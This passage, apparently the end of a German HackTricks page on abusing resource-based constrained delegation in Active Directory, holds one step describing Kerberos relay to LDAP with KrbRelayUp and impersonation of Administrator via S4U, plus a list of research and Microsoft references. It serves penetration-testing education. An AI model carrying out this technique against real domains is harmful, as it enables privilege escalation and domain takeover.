- Wenn LDAP signing/channel binding **deaktiviert** ist und du ein Computerkonto erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für dein Computerkonto am Computerobjekt des Ziels setzen und anschließend **Administrator** per S4U von einem anderen Host aus impersonieren.<sup>[[8]](#references)</sup>

## References

- [1] [Den Hund wedeln lassen: Resource-Based Constrained Delegation missbrauchen, um Active Directory anzugreifen](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Noch ein Wort zur Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Übernahme eines Computerobjekts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Missbrauch von Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity hat die Domain getötet: Ein offensiver Überblick über Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kurzer Linux-Spickzettel mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – Überblick über Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications – Domainübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – RC4-Nutzung in Kerberos erkennen und beheben](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Details zu S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw – RBCD mit einem normalen Benutzerkonto ausnutzen](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade – Constrained Delegation ohne Protocol Transition für SPN-less-Konten missbrauchen](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security – Constrained Delegation ohne Protocol Transition für SPN-less-Konten missbrauchen](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 – S4U2Proxy mit U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU – Verwendung von ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn – Kerberos-Ereignisprotokollierung aktivieren](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
